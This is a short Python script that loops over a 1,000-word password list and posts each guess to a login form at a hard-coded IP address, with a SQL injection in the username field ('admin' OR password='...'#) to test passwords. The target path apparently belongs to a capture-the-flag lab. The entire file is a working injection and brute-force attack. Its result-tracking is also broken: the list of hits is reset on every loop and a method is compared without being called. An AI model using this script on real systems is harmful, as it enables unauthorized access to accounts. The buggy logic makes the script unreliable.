#!/usr/bin/python3

import requests, bs4

file_name = 'top1000.txt'
counter = 0
with open(file_name) as word_list:
    for word in word_list:
        counter += 1
        marked = []
        word = word.rstrip()
        form = {'username': f"admin' OR password='{word}'#", 'password': word}
        response_file = requests.post('http://35.227.24.107/ded33f5bcf/login', data = form)
        crack_soup = bs4.BeautifulSoup(response_file.text, 'html.parser')
        summary = crack_soup.select('form div')
        if (summary[0].getText != 'Unknown user'):
            marked.append(word)
        print(f"Attempt - {counter}: {word} --> {summary[0].getText()}")
    # After running all the words..
    print(marked)
